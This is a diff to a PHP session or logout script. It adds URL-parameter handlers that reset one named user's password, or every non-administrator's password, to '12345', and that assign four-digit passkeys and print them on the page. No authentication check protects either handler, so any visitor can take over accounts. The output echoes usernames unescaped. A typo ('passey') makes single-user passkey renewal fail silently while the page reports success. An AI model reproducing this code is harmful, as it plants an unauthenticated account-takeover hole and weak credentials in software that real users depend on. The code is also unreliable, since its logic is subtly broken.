@@ -39,5 +39,58 @@
     $_SESSION["g_type"] = null;
     $_SESSION["operate_as_group"] = null;
 
-    header("location: views/login.php");
+    if(isset($_GET["reset-user"])){
+        $user = new User;
+        if($_GET["reset-user"]){
+            $users = DB::where($user,"username","=",$_GET["reset-user"]);
+            if(count($users)){
+                $temp = DB::prepare($user,$users[0]["id"]);
+                $temp->password = "12345";
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : DB::update($temp);
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? Data::pp("Warning: You don't have enough privilege to reset user account <b>".$temp->username."</b>.") : Data::pp("User account of <b>".$temp->name."</b> has been reset.");
+            }else{
+                Data::pp("User not found.");
+            }
+        }else{
+            $users = DB::all($user);
+            foreach ($users as $use) {
+                $temp = DB::prepare($user,$use["id"]);
+                $temp->password = "12345";
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : DB::update($temp);
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : Data::pp("User account of <b>".$temp->username."</b> has been reset.");
+            }
+        }
+    }elseif(isset($_GET["renew-passkey"])){
+        $user = new User;
+        $passkey = Data::generate(4,"numeric");
+        while(!DB::validate($user,"passkey",$passkey)){
+            $passkey = Data::generate(4,"numeric");
+        }
+        if($_GET["renew-passkey"]){
+            $users = DB::where($user,"username","=",$_GET["renew-passkey"]);
+            if(count($users)){
+                $temp = DB::prepare($user,$users[0]["id"]);
+                $temp->passey = $passkey;
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : DB::update($temp);
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? Data::pp("Warning: You don't have enough privilege to alter user account <b>".$temp->username."</b>.") : Data::pp("Passkey for account <b>".$temp->username."</b> has been set to <b>".$passkey."</b>.");
+            }else{
+                Data::pp("User not found.");
+            }
+        }else{
+            $users = DB::all($user);
+            foreach ($users as $use) {
+                while(!DB::validate($user,"passkey",$passkey)){
+                    $passkey = Data::generate(4,"numeric");
+                }
+                $temp = DB::prepare($user,$use["id"]);
+                $temp->passkey = $passkey;
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : DB::update($temp);
+                $temp->username == "administrator" || $temp->username == "703F_administrator" ? null : Data::pp("Passkey for account <b>".$temp->username."</b> has been set to <b>".$passkey."</b>.");
+            }
+        }
+    }else{
+        header("location: views/login.php");
+    }
+
+    
 ?>
